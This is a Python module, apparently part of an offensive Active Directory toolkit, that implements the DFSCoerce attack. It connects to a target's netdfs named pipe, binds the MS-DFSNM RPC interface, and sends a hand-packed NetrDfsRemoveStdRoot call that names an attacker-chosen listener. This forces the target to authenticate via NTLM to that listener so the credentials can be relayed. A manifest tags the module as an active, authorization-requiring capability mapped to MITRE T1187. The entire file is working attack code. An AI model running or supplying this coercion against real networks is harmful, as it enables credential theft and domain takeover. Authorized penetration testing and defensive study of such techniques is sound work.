"""DFSCoerce — NTLM coercion via MS-DFSNM NetrDfsRemoveStdRoot."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.coercion.dfscoerce.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ntlm_coercion", "rpc_call"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1187"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target = args.target
    listener = getattr(args, "listener", None)

    if not listener:
        print("[!] --listener required", file=sys.stderr)
        return 1

    print(f"[*] DFSCoerce: {target} → coerce to {listener}")

    try:
        from impacket.dcerpc.v5 import transport
        from impacket import uuid
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    DFSNM_UUID = uuid.uuidtup_to_bin(("4fc742e0-4a10-11cf-8273-00aa004ae673", "3.0"))

    try:
        string_binding = f"ncacn_np:{target}[\\pipe\\netdfs]"
        rpc_transport = transport.DCERPCTransportFactory(string_binding)

        if cred.username:
            rpc_transport.set_credentials(
                cred.username, cred.password or "", cred.domain,
                cred.lm_hash, cred.nt_hash)

        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(DFSNM_UUID)

        import struct
        server_name = f"\\\\{listener}"
        request = struct.pack("<I", len(server_name) + 1)
        request += struct.pack("<I", 0)
        request += struct.pack("<I", len(server_name) + 1)
        request += server_name.encode("utf-16-le") + b"\x00\x00"

        try:
            dce.call(12, request)
        except Exception:
            pass

        print(f"[+] DFSCoerce triggered — check relay on {listener}")
        dce.disconnect()
        return 0

    except Exception as exc:
        print(f"[-] DFSCoerce error: {exc}", file=sys.stderr)
        return 1
